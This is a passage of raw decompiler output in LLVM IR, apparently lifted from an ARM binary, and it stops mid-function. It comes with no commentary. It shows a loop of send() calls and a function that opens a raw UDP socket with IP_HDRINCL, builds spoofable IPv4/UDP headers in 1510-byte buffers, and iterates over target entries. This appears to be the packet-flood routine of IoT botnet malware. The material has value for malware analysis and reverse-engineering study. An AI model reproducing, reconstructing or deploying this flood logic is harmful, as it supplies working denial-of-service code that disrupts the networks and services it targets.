dec_label_pc_ca98.lr.ph:                          ; preds = %dec_label_pc_cacc.preheader, %dec_label_pc_cacc.loopexit
  br label %dec_label_pc_ca98

dec_label_pc_cad0.loopexit:                       ; preds = %dec_label_pc_cae8
  %tmp45 = icmp slt i32 %v0_cb10, 1
  br i1 %tmp45, label %dec_label_pc_ca94, label %dec_label_pc_ca98

dec_label_pc_cad8:                                ; preds = %dec_label_pc_c974
  store i32 %v3_c83c, i32* %r4.global-to-local, align 4
  store i32 %v6_c83c, i32* %r5.global-to-local, align 4
  store i32 %v24_c83c, i32* %fp.global-to-local, align 4
  ret i32 -1

dec_label_pc_cae0:                                ; preds = %dec_label_pc_ca98
  store i32 0, i32* @fp, align 4
  br label %dec_label_pc_cae8

dec_label_pc_cae8:                                ; preds = %dec_label_pc_cae8, %dec_label_pc_cae0
  %v0_cae8 = phi i32 [ %v1_cb14, %dec_label_pc_cae8 ], [ 0, %dec_label_pc_cae0 ]
  %v1_cae8 = load i32, i32* @sl, align 4
  %v2_cae8 = add i32 %v1_cae8, %v0_cae8
  %v3_cae8 = inttoptr i32 %v2_cae8 to i32*
  %v4_cae8 = load i32, i32* %v3_cae8, align 4
  store i32 %v4_cae8, i32* @r4, align 4
  %v0_caec = load i32, i32* @r6, align 4
  store i32 %v0_caec, i32* @r1, align 4
  %v1_caf4 = inttoptr i32 %v4_cae8 to i8*
  %v2_caf4 = call i32 @function_f844(i8* %v1_caf4)
  %v0_caf8 = load i32, i32* @r5, align 4
  %v1_caf8 = add i32 %v0_caf8, 1
  store i32 %v1_caf8, i32* @r5, align 4
  %v0_cafc = load i32, i32* @fp, align 4
  %v1_cafc = load i32, i32* @sb, align 4
  %v2_cafc = add i32 %v1_cafc, %v0_cafc
  %v3_cafc = inttoptr i32 %v2_cafc to i32*
  %v4_cafc = load i32, i32* %v3_cafc, align 4
  %v0_cb00 = load i32, i32* @r4, align 4
  store i32 %v0_cb00, i32* %r1.global-to-local, align 4
  %v0_cb04 = load i32, i32* @r6, align 4
  %v4_cb0c = inttoptr i32 %v0_cb00 to i32*
  %v5_cb0c = call i32 @send(i32 %v4_cafc, i32* %v4_cb0c, i32 %v0_cb04, i32 16384)
  %v0_cb10 = load i32, i32* @r5, align 4
  %v1_cb10 = load i32, i32* @r7, align 4
  %v9_cb10 = icmp eq i32 %v0_cb10, %v1_cb10
  %v0_cb14 = load i32, i32* @fp, align 4
  %v1_cb14 = add i32 %v0_cb14, 4
  store i32 %v1_cb14, i32* @fp, align 4
  br i1 %v9_cb10, label %dec_label_pc_cad0.loopexit, label %dec_label_pc_cae8

; uselistorder directives
  uselistorder i32 %v1_cb14, { 1, 0 }
  uselistorder i32 %v0_cb10, { 1, 0 }
  uselistorder i32 %v1_cac4, { 1, 0 }
  uselistorder i32 %v1_cab0, { 2, 0, 3, 1 }
  uselistorder i32 %stack_var_-60.0, { 0, 2, 4, 1, 3 }
  uselistorder i32 %v8_ca04, { 1, 2, 0 }
  uselistorder i32 %v3_c9dc, { 1, 2, 0, 3 }
  uselistorder i32 %v3_c98c, { 2, 1, 0 }
  uselistorder i32 %v1_c97c, { 1, 2, 0 }
  uselistorder i32 %v3_c8e4, { 0, 2, 1 }
  uselistorder i32 %v3_c894, { 0, 3, 1, 2 }
  uselistorder i32 %v1_c840, { 1, 0 }
  uselistorder i8* %stack_var_-80, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 1, 0, 3, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 4, 5, 2, 6, 3, 7, 8, 9, 10, 11 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 11, 12, 3, 4, 5, 6, 7, 8, 9, 10, 13, 14, 16, 15, 17, 19, 18, 0 }
  uselistorder label %dec_label_pc_ca98.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_ca98, { 1, 0 }
  uselistorder label %dec_label_pc_ca94, { 3, 0, 4, 2, 1 }
  uselistorder label %dec_label_pc_ca28, { 1, 0 }
  uselistorder label %dec_label_pc_c920, { 1, 0 }
}

define i32 @function_cb24(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_cb24:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_cb24 = load i32, i32* @r4, align 4
  %v6_cb24 = load i32, i32* @r5, align 4
  %v9_cb24 = load i32, i32* @r6, align 4
  %v12_cb24 = load i32, i32* @r7, align 4
  %v18_cb24 = load i32, i32* @sb, align 4
  %v24_cb24 = load i32, i32* @fp, align 4
  %v1_cb28 = urem i32 %arg1, 256
  store i32 %v1_cb28, i32* @sl, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %v1_cb28, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_cb40 = urem i32 %arg3, 256
  store i32 %v1_cb40, i32* @r4, align 4
  %v2_cb44 = call i32* @calloc(i32 %v1_cb28, i32 4)
  %v4_cb44 = ptrtoint i32* %v2_cb44 to i32
  %v0_cb48 = load i32, i32* @r5, align 4
  store i32 %v0_cb48, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_cb58 = load i32, i32* @r4, align 4
  store i32 %v0_cb58, i32* %r0.global-to-local, align 4
  %v5_cb5c = inttoptr i32 %v0_cb48 to i32*
  %v6_cb5c = call i32 @function_930c(i32 %v0_cb58, i32* %v5_cb5c, i32 2, i32 0, i32 %v4_cb44)
  %v1_cb68 = urem i32 %v6_cb5c, 256
  store i32 %v1_cb68, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_cb74 = load i32, i32* @r5, align 4
  store i32 %v0_cb74, i32* %r1.global-to-local, align 4
  %v0_cb78 = load i32, i32* @r4, align 4
  store i32 %v0_cb78, i32* %r0.global-to-local, align 4
  %v5_cb7c = trunc i32 %v6_cb5c to i8
  %v6_cb80 = inttoptr i32 %v0_cb74 to i32*
  %v7_cb80 = call i32 @function_930c(i32 %v0_cb78, i32* %v6_cb80, i32 3, i32 65535, i32 %v6_cb5c)
  %v0_cb84 = load i32, i32* @r5, align 4
  store i32 %v0_cb84, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_cb80, i32* %fp.global-to-local, align 4
  %v0_cb94 = load i32, i32* @r4, align 4
  store i32 %v0_cb94, i32* %r0.global-to-local, align 4
  %v5_cb98 = inttoptr i32 %v0_cb84 to i32*
  %v6_cb98 = call i32 @function_930c(i32 %v0_cb94, i32* %v5_cb98, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_cba0 = urem i32 %v6_cb98, 256
  store i32 %v1_cba0, i32* %ip.global-to-local, align 4
  %v0_cba4 = load i32, i32* @r5, align 4
  store i32 %v0_cba4, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_cbb0 = load i32, i32* @r4, align 4
  store i32 %v0_cbb0, i32* %r0.global-to-local, align 4
  %v5_cbb4 = trunc i32 %v6_cb98 to i8
  %v6_cbb8 = inttoptr i32 %v0_cba4 to i32*
  %v7_cbb8 = call i32 @function_930c(i32 %v0_cbb0, i32* %v6_cbb8, i32 5, i32 0, i32 %v6_cb98)
  %v1_cbc4 = urem i32 %v7_cbb8, 256
  store i32 %v1_cbc4, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_cbd0 = load i32, i32* @r5, align 4
  store i32 %v0_cbd0, i32* %r1.global-to-local, align 4
  %v0_cbd4 = load i32, i32* @r4, align 4
  store i32 %v0_cbd4, i32* %r0.global-to-local, align 4
  %v5_cbdc = inttoptr i32 %v0_cbd0 to i32*
  %v6_cbdc = call i32 @function_930c(i32 %v0_cbd4, i32* %v5_cbdc, i32 6, i32 65535, i32 %v1_cbc4)
  %v0_cbe4 = load i32, i32* @r5, align 4
  store i32 %v0_cbe4, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_cbdc, i32* @r7, align 4
  %v0_cbf4 = load i32, i32* @r4, align 4
  store i32 %v0_cbf4, i32* %r0.global-to-local, align 4
  %v5_cbf8 = inttoptr i32 %v0_cbe4 to i32*
  %v6_cbf8 = call i32 @function_930c(i32 %v0_cbf4, i32* %v5_cbf8, i32 7, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_cbfc = load i32, i32* @r5, align 4
  store i32 %v0_cbfc, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v6_cbf8, i32* %sb.global-to-local, align 4
  %v0_cc0c = load i32, i32* @r4, align 4
  store i32 %v0_cc0c, i32* %r0.global-to-local, align 4
  %v5_cc10 = inttoptr i32 %v0_cbfc to i32*
  %v6_cc10 = call i32 @function_930c(i32 %v0_cc0c, i32* %v5_cc10, i32 0, i32 512, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_cc1c = load i32, i32* @r5, align 4
  store i32 %v0_cc1c, i32* %r1.global-to-local, align 4
  store i32 %v6_cc10, i32* @r6, align 4
  %v0_cc24 = load i32, i32* @r4, align 4
  store i32 %v0_cc24, i32* %r0.global-to-local, align 4
  %v5_cc28 = inttoptr i32 %v0_cc1c to i32*
  %v6_cc28 = call i32 @function_930c(i32 %v0_cc24, i32* %v5_cc28, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v2_cc34 = load i32, i32* @global_var_1a714.104, align 4
  store i32 %v2_cc34, i32* %r3.global-to-local, align 4
  %v1_cc38 = urem i32 %v6_cc28, 256
  store i32 %v1_cc38, i32* %ip.global-to-local, align 4
  %v0_cc3c = load i32, i32* @r5, align 4
  store i32 %v0_cc3c, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_cc44 = load i32, i32* @r4, align 4
  store i32 %v0_cc44, i32* %r0.global-to-local, align 4
  %v5_cc4c = inttoptr i32 %v0_cc3c to i32*
  %v6_cc4c = call i32 @function_930c(i32 %v0_cc44, i32* %v5_cc4c, i32 25, i32 %v2_cc34, i32 %v1_cc38)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_cc60 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_cc60, i32* %r0.global-to-local, align 4
  %v2_cc64 = icmp eq i32 %v3_cc60, -1
  store i1 %v2_cc64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_cc64, label %dec_label_pc_d08c, label %dec_label_pc_cc70

dec_label_pc_cc70:                                ; preds = %dec_label_pc_cb24
  store i32 1, i32* %stack_var_-40, align 4
  %v6_cc78 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_cc78, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v7_cc8c = call i32 @setsockopt(i32 %v3_cc60, i32 0, i32 3, i32* nonnull %stack_var_-40, i32 4)
  store i32 %v7_cc8c, i32* %r0.global-to-local, align 4
  %v2_cc90 = icmp eq i32 %v7_cc8c, -1
  store i1 %v2_cc90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_cc90, label %dec_label_pc_d084, label %dec_label_pc_cc98

dec_label_pc_cc98:                                ; preds = %dec_label_pc_cc70
  %v0_cc98 = load i32, i32* @r6, align 4
  store i32 1460, i32* %r3.global-to-local, align 4
  %v3_cca4 = urem i32 %v0_cc98, 65536
  store i32 %v3_cca4, i32* %r2.global-to-local, align 4
  %v3_cca8 = icmp ugt i32 %v3_cca4, 1459
  %v9_cca8 = icmp eq i32 %v3_cca4, 1460
  store i1 %v9_cca8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_cca8, label %bb, label %bb71

bb:                                               ; preds = %dec_label_pc_cc98
  store i32 1460, i32* %r2.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %dec_label_pc_cc98, %bb
  %v0_ccb0 = phi i32 [ %v3_cca4, %dec_label_pc_cc98 ], [ 1460, %bb ]
  %v0_ccb4 = load i32, i32* @r7, align 4
  %v3_ccb4 = mul i32 %v0_ccb4, 65536
  store i32 %v3_ccb4, i32* %r7.global-to-local, align 4
  %v3_ccb8 = urem i32 %v0_ccb4, 65536
  store i32 %v3_ccb8, i32* %r3.global-to-local, align 4
  %v0_ccbc = load i32, i32* @sl, align 4
  %v2_ccbc = icmp eq i32 %v0_ccbc, 0
  store i1 %v2_ccbc, i1* %cpsr_z.global-to-local, align 1
  %v0_ccc0 = load i32, i32* %fp.global-to-local, align 4
  %v3_ccc0 = mul i32 %v0_ccc0, 65536
  store i32 %v3_ccc0, i32* %r0.global-to-local, align 4
  %v0_ccc4 = load i32, i32* %sb.global-to-local, align 4
  %v3_ccc4 = mul i32 %v0_ccc4, 65536
  store i32 %v3_ccc4, i32* %r5.global-to-local, align 4
  %tmp72 = icmp slt i32 %v0_ccbc, 1
  br i1 %tmp72, label %bb73, label %bb74

bb73:                                             ; preds = %bb71
  store i32 %v0_ccb0, i32* %r3.global-to-local, align 4
  br label %bb74

bb74:                                             ; preds = %bb71, %bb73
  %v5_ccec = phi i32 [ %v3_ccb8, %bb71 ], [ %v0_ccb0, %bb73 ]
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_ccd4 = urem i32 %v0_ccc0, 65536
  store i32 %v3_ccd4, i32* %r2.global-to-local, align 4
  %v3_ccd8 = urem i32 %v0_ccc4, 65536
  store i32 %v3_ccd8, i32* %ip.global-to-local, align 4
  store i32 0, i32* %stack_var_-40, align 4
  br i1 %tmp72, label %.thread, label %dec_label_pc_ccf4

.thread:                                          ; preds = %bb74
  %v6_cce8 = add nsw i32 %v5_ccec, 28
  store i32 %v6_cce8, i32* @fp, align 4
  %v6_ccec = add nsw i32 %v5_ccec, 8
  store i32 %v6_ccec, i32* @sb, align 4
  br label %dec_label_pc_ce68

dec_label_pc_ccf4:                                ; preds = %bb74
  %v1_ccf8 = add nuw nsw i32 %v0_ccb0, 28
  store i32 %v1_ccf8, i32* @fp, align 4
  %tmp75 = mul nuw nsw i32 %v1_ccf8, 256
  %v1_cd04 = and i32 %tmp75, 65280
  %tmp76 = udiv i32 %v0_ccc0, 256
  %v3_cd08 = urem i32 %tmp76, 256
  %v2_cd1c = icmp eq i32 %v1_cbc4, 0
  store i1 %v2_cd1c, i1* %cpsr_z.global-to-local, align 1
  %v1_cd20 = urem i32 %v0_ccc0, 256
  %v1_cd28 = add nuw nsw i32 %v0_ccb0, 8
  store i32 %v1_cd28, i32* @sb, align 4
  %v3_cd2c = mul i32 %v1_cd28, 65536
  store i32 %v3_cd2c, i32* %r6.global-to-local, align 4
  %v1_cd30 = urem i32 %v0_ccb4, 256
  %v1_cd34 = urem i32 %v0_ccc4, 256
  store i32 %v1_cd34, i32* %ip.global-to-local, align 4
  store i32 %v1_cd04, i32* %r3.global-to-local, align 4
  %tmp77 = mul nuw nsw i32 %v1_cd28, 256
  %v4_cd40 = mul nuw nsw i32 %v1_cd20, 256
  %v5_cd40 = or i32 %v4_cd40, %v3_cd08
  store i32 %v5_cd40, i32* %r0.global-to-local, align 4
  %v3_cd44 = mul nuw nsw i32 %v1_cd30, 256
  store i32 %v3_cd44, i32* %r2.global-to-local, align 4
  %tmp78 = udiv i32 %v0_ccc4, 256
  %v3_cd48 = urem i32 %tmp78, 256
  %v1_cd4c = and i32 %tmp77, 65280
  store i32 %v1_cd4c, i32* %r1.global-to-local, align 4
  %tmp79 = udiv i32 %v1_ccf8, 256
  %tmp80 = udiv i32 %v0_ccb4, 256
  %v4_cd54 = urem i32 %tmp80, 256
  %v5_cd54 = or i32 %v4_cd54, %v3_cd44
  store i32 %v5_cd54, i32* %r4.global-to-local, align 4
  %v5_cd58 = trunc i32 %tmp79 to i8
  %v5_cd5c = trunc i32 %tmp76 to i8
  %v4_cd60 = mul nuw nsw i32 %v1_cd34, 256
  %v5_cd60 = or i32 %v4_cd60, %v3_cd48
  store i32 %v5_cd60, i32* %r5.global-to-local, align 4
  %tmp81 = udiv i32 %v1_cd28, 256
  %v4_cd64 = urem i32 %tmp81, 256
  %v5_cd64 = or i32 %v4_cd64, %v1_cd4c
  store i32 %v5_cd64, i32* %r7.global-to-local, align 4
  br i1 %v2_cd1c, label %dec_label_pc_cd6c, label %dec_label_pc_d094

dec_label_pc_cd6c:                                ; preds = %dec_label_pc_ccf4
  %v3_cd6c36 = udiv i32 %v1_cd04, 256
  store i32 %v3_cd6c36, i32* %ip.global-to-local, align 4
  store i32 %v1_cd20, i32* %r0.global-to-local, align 4
  store i32 %v1_cd30, i32* %r1.global-to-local, align 4
  store i32 %v1_cd34, i32* %r2.global-to-local, align 4
  %v3_cd7c37 = udiv i32 %v1_cd4c, 256
  store i32 %v3_cd7c37, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  %v4_ce20 = sext i8 %v5_cd5c to i32
  %sext15 = mul i32 %v0_ccc0, 16777216
  %v4_ce24 = sdiv i32 %sext15, 16777216
  %sext16 = mul i32 %v0_ccb4, 16777216
  %v4_ce3c = sdiv i32 %sext16, 16777216
  %sext17 = mul i32 %v1_cd28, 16777216
  %v4_ce40 = sdiv i32 %sext17, 16777216
  %sext18 = mul i32 %v0_ccc4, 16777216
  %v4_ce44 = sdiv i32 %sext18, 16777216
  %v1_ce2c = trunc i32 %v1_ccf8 to i8
  %v1_ce4c = trunc i32 %v4_ce40 to i8
  br label %dec_label_pc_cd98

dec_label_pc_cd98:                                ; preds = %dec_label_pc_cd98, %dec_label_pc_cd6c
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_cda4 = call i32* @calloc(i32 1510, i32 1)
  %v4_cda4 = ptrtoint i32* %v2_cda4 to i32
  store i32 %v4_cda4, i32* %r0.global-to-local, align 4
  store i32 %v4_cb44, i32* %ip.global-to-local, align 4
  %v3_cdac = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_cdac, i32* %r2.global-to-local, align 4
  %v2_cdb0 = load i32, i32* %r6.global-to-local, align 4
  %v5_cdb0 = mul i32 %v2_cdb0, 4
  %v6_cdb0 = add i32 %v5_cdb0, %v4_cb44
  %v7_cdb0 = inttoptr i32 %v6_cdb0 to i32*
  store i32 %v4_cda4, i32* %v7_cdb0, align 4
  %v0_cdb4 = load i32, i32* %ip.global-to-local, align 4
  %v1_cdb4 = load i32, i32* %r2.global-to-local, align 4
  %v4_cdb4 = mul i32 %v1_cdb4, 4
  %v5_cdb4 = add i32 %v4_cdb4, %v0_cdb4
  %v6_cdb4 = inttoptr i32 %v5_cdb4 to i32*
  %v7_cdb4 = load i32, i32* %v6_cdb4, align 4
  store i32 %v7_cdb4, i32* %r1.global-to-local, align 4
  %v1_cdb8 = inttoptr i32 %v7_cdb4 to i8*
  %v2_cdb8 = load i8, i8* %v1_cdb8, align 1
  %tmp = urem i8 %v2_cdb8, 16
  %v1_cdbc = zext i8 %tmp to i32
  %v1_cdc0 = or i32 %v1_cdbc, 64
  store i32 %v1_cdc0, i32* %r3.global-to-local, align 4
  %v1_cdc4 = trunc i32 %v1_cdc0 to i8
  store i8 %v1_cdc4, i8* %v1_cdb8, align 1
  %v0_cdc8 = load i32, i32* %r1.global-to-local, align 4
  %v1_cdc8 = inttoptr i32 %v0_cdc8 to i8*
  %v2_cdc8 = load i8, i8* %v1_cdc8, align 1
  %v3_cdc8 = zext i8 %v2_cdc8 to i32
  %v1_cdcc = and i32 %v3_cdc8, 240
  %v1_cdd0 = or i32 %v1_cdcc, 5
  store i32 %v1_cdd0, i32* %r2.global-to-local, align 4
  %v3_cdd8 = add i32 %v0_cdc8, 9
  %v4_cdd8 = inttoptr i32 %v3_cdd8 to i8*
  store i8 17, i8* %v4_cdd8, align 1
  %v0_cddc = load i32, i32* %r2.global-to-local, align 4
  %v1_cddc = trunc i32 %v0_cddc to i8
  %v2_cddc = load i32, i32* %r1.global-to-local, align 4
  %v3_cddc = inttoptr i32 %v2_cddc to i8*
  store i8 %v1_cddc, i8* %v3_cddc, align 1
  store i32 %v6_cb5c, i32* %r0.global-to-local, align 4
  %v2_cde4 = load i32, i32* %r1.global-to-local, align 4
  %v3_cde4 = add i32 %v2_cde4, 1
  %v4_cde4 = inttoptr i32 %v3_cde4 to i8*
  store i8 %v5_cb7c, i8* %v4_cde4, align 1
  %v2_cdec = load i32, i32* %r1.global-to-local, align 4
  %v3_cdec = add i32 %v2_cdec, 8
  %v4_cdec = inttoptr i32 %v3_cdec to i8*
  store i8 %v5_cbb4, i8* %v4_cdec, align 1
  %v3_cdf0 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_cdf0, i32* %r2.global-to-local, align 4
  store i32 %v6_cc4c, i32* %ip.global-to-local, align 4
  %v3_cdf8 = mul i32 %v3_cdf0, 32
  store i32 %v3_cdf8, i32* %r3.global-to-local, align 4
  %v1_cdfc = load i32, i32* %r1.global-to-local, align 4
  %v2_cdfc = add i32 %v1_cdfc, 12
  %v3_cdfc = inttoptr i32 %v2_cdfc to i32*
  store i32 %v6_cc4c, i32* %v3_cdfc, align 4
  %v0_ce00 = load i32, i32* %r3.global-to-local, align 4
  %v1_ce00 = load i32, i32* %r2.global-to-local, align 4
  %tmp83 = mul i32 %v1_ce00, -8
  %v5_ce00 = add i32 %v0_ce00, %tmp83
  %v1_ce04 = load i32, i32* @r8, align 4
  %v2_ce04 = add i32 %v5_ce00, %v1_ce04
  store i32 %v2_ce04, i32* %r3.global-to-local, align 4
  %v1_ce08 = add i32 %v2_ce04, 16
  %v2_ce08 = inttoptr i32 %v1_ce08 to i32*
  %v3_ce08 = load i32, i32* %v2_ce08, align 4
  %v1_ce0c = load i32, i32* %r1.global-to-local, align 4
  %v2_ce0c = add i32 %v1_ce0c, 16
  %v3_ce0c = inttoptr i32 %v2_ce0c to i32*
  store i32 %v3_ce08, i32* %v3_ce0c, align 4
  %v0_ce14 = load i32, i32* %r2.global-to-local, align 4
  %v1_ce14 = add i32 %v0_ce14, 1
  store i32 %v1_ce14, i32* %r6.global-to-local, align 4
  %v2_ce18 = load i32, i32* %r1.global-to-local, align 4
  %v3_ce18 = add i32 %v2_ce18, 2
  %v4_ce18 = inttoptr i32 %v3_ce18 to i8*
  store i8 %v5_cd58, i8* %v4_ce18, align 1
  store i32 %v4_ce20, i32* %ip.global-to-local, align 4
  store i32 %v4_ce24, i32* %r0.global-to-local, align 4
  %v0_ce28 = load i32, i32* %r1.global-to-local, align 4
  %v1_ce28 = add i32 %v0_ce28, 20
  store i32 %v1_ce28, i32* %r3.global-to-local, align 4
  %v3_ce2c = add i32 %v0_ce28, 3
  %v4_ce2c = inttoptr i32 %v3_ce2c to i8*
  store i8 %v1_ce2c, i8* %v4_ce2c, align 1
  %v0_ce30 = load i32, i32* %ip.global-to-local, align 4
  %v1_ce30 = trunc i32 %v0_ce30 to i8
  %v2_ce30 = load i32, i32* %r1.global-to-local, align 4
  %v3_ce30 = add i32 %v2_ce30, 4
  %v4_ce30 = inttoptr i32 %v3_ce30 to i8*
  store i8 %v1_ce30, i8* %v4_ce30, align 1
  %v0_ce34 = load i32, i32* %r0.global-to-local, align 4
  %v1_ce34 = trunc i32 %v0_ce34 to i8
  %v2_ce34 = load i32, i32* %r1.global-to-local, align 4
  %v3_ce34 = add i32 %v2_ce34, 5
  %v4_ce34 = inttoptr i32 %v3_ce34 to i8*
  store i8 %v1_ce34, i8* %v4_ce34, align 1
  %v0_ce38 = load i32, i32* %r4.global-to-local, align 4
  %v1_ce38 = trunc i32 %v0_ce38 to i8
  %v2_ce38 = load i32, i32* %r1.global-to-local, align 4
  %v3_ce38 = add i32 %v2_ce38, 20
  %v4_ce38 = inttoptr i32 %v3_ce38 to i8*
  store i8 %v1_ce38, i8* %v4_ce38, align 1
  store i32 %v4_ce3c, i32* %r2.global-to-local, align 4
  store i32 %v4_ce40, i32* %r1.global-to-local, align 4
  store i32 %v4_ce44, i32* %ip.global-to-local, align 4
  %v0_ce48 = load i32, i32* %r6.global-to-local, align 4
  %v1_ce48 = load i32, i32* @sl, align 4
  %v9_ce48 = icmp eq i32 %v0_ce48, %v1_ce48
  store i1 %v9_ce48, i1* %cpsr_z.global-to-local, align 1
  %v2_ce4c = load i32, i32* %r3.global-to-local, align 4
  %v3_ce4c = add i32 %v2_ce4c, 5
  %v4_ce4c = inttoptr i32 %v3_ce4c to i8*
  store i8 %v1_ce4c, i8* %v4_ce4c, align 1
  %v0_ce50 = load i32, i32* %r2.global-to-local, align 4
  %v1_ce50 = trunc i32 %v0_ce50 to i8
  %v2_ce50 = load i32, i32* %r3.global-to-local, align 4
  %v3_ce50 = add i32 %v2_ce50, 1
  %v4_ce50 = inttoptr i32 %v3_ce50 to i8*
  store i8 %v1_ce50, i8* %v4_ce50, align 1
  %v0_ce54 = load i32, i32* %r5.global-to-local, align 4
  %v1_ce54 = trunc i32 %v0_ce54 to i8
  %v2_ce54 = load i32, i32* %r3.global-to-local, align 4
  %v3_ce54 = add i32 %v2_ce54, 2
  %v4_ce54 = inttoptr i32 %v3_ce54 to i8*
  store i8 %v1_ce54, i8* %v4_ce54, align 1
  %v0_ce58 = load i32, i32* %ip.global-to-local, align 4
  %v1_ce58 = trunc i32 %v0_ce58 to i8
  %v2_ce58 = load i32, i32* %r3.global-to-local, align 4
  %v3_ce58 = add i32 %v2_ce58, 3
  %v4_ce58 = inttoptr i32 %v3_ce58 to i8*
  store i8 %v1_ce58, i8* %v4_ce58, align 1
  %v0_ce5c = load i32, i32* %r7.global-to-local, align 4
  %v1_ce5c = trunc i32 %v0_ce5c to i8
  %v2_ce5c = load i32, i32* %r3.global-to-local, align 4
  %v3_ce5c = add i32 %v2_ce5c, 4
  %v4_ce5c = inttoptr i32 %v3_ce5c to i8*
  store i8 %v1_ce5c, i8* %v4_ce5c, align 1
  %v0_ce60 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_ce60, i32* %stack_var_-40, align 4
  %v5_ce64 = icmp slt i32 %v0_ce48, %v1_ce48
  br i1 %v5_ce64, label %dec_label_pc_cd98, label %dec_label_pc_ce68

dec_label_pc_ce68:                                ; preds = %dec_label_pc_d0c8, %dec_label_pc_cd98, %.thread
  %v0_ce68 = load i32, i32* @sl, align 4
  %v2_ce68 = icmp eq i32 %v0_ce68, 0
  store i1 %v2_ce68, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_d014 = icmp eq i32 %v3_ccd4, 65535
  %v2_cee0 = icmp eq i32 %v1_cc38, 0
  %v2_cea8 = icmp eq i32 %v6_cc4c, -1
  br label %dec_label_pc_ce70.outer

dec_label_pc_ce70.outer:                          ; preds = %dec_label_pc_cf90, %dec_label_pc_ce68
  %v1_ce70.ph.in = phi i32 [ %v1_cf84, %dec_label_pc_cf90 ], [ %v0_ce68, %dec_label_pc_ce68 ]
  %v0_ce70.ph = phi i1 [ %v2_cf90, %dec_label_pc_cf90 ], [ %v2_ce68, %dec_label_pc_ce68 ]
  %v1_ce70.ph = icmp slt i32 %v1_ce70.ph.in, 0
  %v4_ce70 = or i1 %v1_ce70.ph, %v0_ce70.ph
  br label %dec_label_pc_ce70

dec_label_pc_ce70:                                ; preds = %dec_label_pc_ce70.outer, %dec_label_pc_ce70
  br i1 %v4_ce70, label %dec_label_pc_ce70, label %dec_label_pc_ce74

dec_label_pc_ce74:                                ; preds = %dec_label_pc_ce70
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_ce80

dec_label_pc_ce80:                                ; preds = %dec_label_pc_cee8, %dec_label_pc_ce74
  %v1_ce94 = phi i32 [ %v1_cf80, %dec_label_pc_cee8 ], [ 0, %dec_label_pc_ce74 ]
  %v5_ce84 = mul i32 %v1_ce94, 24
  %v1_ce88 = load i32, i32* @r8, align 4
  %v2_ce88 = add i32 %v1_ce88, %v5_ce84
  store i32 %v2_ce88, i32* %r3.global-to-local, align 4
  store i32 %v4_cb44, i32* %ip.global-to-local, align 4
  %v1_ce90 = add i32 %v2_ce88, 20
  %v2_ce90 = inttoptr i32 %v1_ce90 to i8*
  %v3_ce90 = load i8, i8* %v2_ce90, align 1
  %v4_ce90 = zext i8 %v3_ce90 to i32
  store i32 %v4_ce90, i32* %r2.global-to-local, align 4
  %v4_ce94 = mul i32 %v1_ce94, 4
